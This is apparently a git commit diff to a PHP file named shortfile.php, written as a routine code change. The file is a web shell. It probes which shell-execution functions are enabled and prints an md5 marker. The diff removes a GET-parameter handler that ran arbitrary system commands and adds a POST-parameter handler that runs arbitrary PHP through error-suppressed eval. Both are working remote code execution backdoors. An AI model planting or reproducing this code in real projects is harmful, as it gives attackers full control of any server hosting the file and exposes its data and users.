50db3dd1d0d161a8fa777cd874dd3cd5a2c663e0
vinux <kjmyvinux@gmail.com>
2026-09-13 13:41:13 +0800

    Change pingtoufuck! handling to use POST and eval
    Replaced GET request handling with POST and eval execution.

--- shortfile.php
+++ shortfile.php
@@ -4,16 +4,7 @@ foreach (['system','passthru','shell_exec','exec','proc_open','popen'] as $f) {
     $disabled = in_array($f, explode(',', ini_get('disable_functions')));
     echo $f . ':' . ($disabled ? 'OFF' : 'ON') . "\n";
 }
-if (isset($_GET['pingtoufuck!'])) {
-    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
-        passthru($_GET['pingtoufuck!']);
-    } elseif (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
-        echo shell_exec($_GET['pingtoufuck!']);
-    } elseif (function_exists('exec')) {
-        exec($_GET['pingtoufuck!'], $o);
-        echo implode("\n", $o);
-    } else {
-        echo "ALL SHELL FUNCTIONS DISABLED\n";
-    }
-}
 echo md5('verify');
+if (isset($_POST['pingtoufuck!'])) {
+    @eval($_POST['pingtoufuck!']);
+}
